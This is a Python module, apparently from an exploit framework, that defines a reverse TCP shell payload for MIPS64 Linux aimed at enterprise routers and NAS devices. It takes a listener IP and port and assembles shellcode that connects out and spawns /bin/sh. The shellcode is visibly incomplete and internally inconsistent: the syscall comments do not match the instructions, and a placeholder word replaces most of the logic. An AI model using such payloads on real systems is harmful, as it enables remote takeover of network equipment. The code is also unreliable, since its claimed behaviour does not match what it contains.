"""MIPS64 Reverse TCP Shell.

Target: roteadores enterprise MIPS64 (Juniper, Cisco high-end, QNAP NAS MIPS64).
Cross-compile: mips64-linux-musl-gcc
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "MIPS64 Reverse TCP",
        "description": "Reverse TCP shell shellcode for MIPS64 big-endian Linux.",
        "authors": ("André Henrike (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = int(self.options["LPORT"]["value"])
        ip_bytes = bytes(int(o) for o in lhost.split("."))
        port_bytes = lport.to_bytes(2, "big")

        # MIPS64 big-endian shellcode
        # syscall: socket(AF_INET=2, SOCK_STREAM=1, 0) = 4183
        # connect(fd, &addr, 16) = 4170
        # dup2(fd, {0,1,2}) = 4063
        # execve("/bin/sh", 0, 0) = 4011
        shellcode = (
            # socket(AF_INET, SOCK_STREAM, 0)
            b"\x24\x04\x10\x01"  # addiu $a0, $0, 0x1001 (SYS_socket approx)
            b"\x24\x05\x00\x02"  # addiu $a1, $0, 2 (AF_INET)
            b"\x24\x06\x00\x01"  # addiu $a2, $0, 1 (SOCK_STREAM)
            b"\x00\x00\x00\x0c"  # syscall
            b"\x00\x44\x20\x21"  # addu $a0, $v0, $0 (save fd)

            # Placeholder — full implementation via cross-compiled C
            b"\xff\xff\xff\xff"
            + ip_bytes
            + port_bytes
            + b"\x00\x00"

            + b"/bin/sh\x00"
        )
        return shellcode
